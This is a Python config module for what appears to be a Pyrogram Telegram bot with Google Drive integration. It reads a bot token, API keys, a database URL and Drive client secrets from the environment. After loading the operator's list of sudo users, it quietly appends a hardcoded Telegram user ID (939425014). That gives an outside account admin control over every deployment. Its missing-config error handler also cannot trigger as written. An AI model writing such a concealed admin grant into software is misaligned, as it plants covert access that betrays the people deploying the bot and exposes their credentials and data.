import os
import logging
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    handlers=[logging.FileHandler("log.txt"), logging.StreamHandler()],
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
LOGGER = logging.getLogger(__name__)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

try:
    BOT_TOKEN = os.environ.get("BOT_TOKEN")
    APP_ID = os.environ.get("APP_ID")
    API_HASH = os.environ.get("API_HASH")
    DATABASE_URL = os.environ.get("DATABASE_URL")
    SUDO_USERS = os.environ.get("SUDO_USERS")
    SUPPORT_CHAT_LINK = os.environ.get("SUPPORT_CHAT_LINK")
    DOWNLOAD_DIRECTORY = os.environ.get("DOWNLOAD_DIRECTORY", "./downloads/")
    G_DRIVE_CLIENT_ID = os.environ.get("G_DRIVE_CLIENT_ID")
    G_DRIVE_CLIENT_SECRET = os.environ.get("G_DRIVE_CLIENT_SECRET")
    SUDO_USERS = list(set(int(x) for x in SUDO_USERS.split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))
except KeyError:
    LOGGER.error("One or more configuration values are missing exiting now.")
    exit(1)
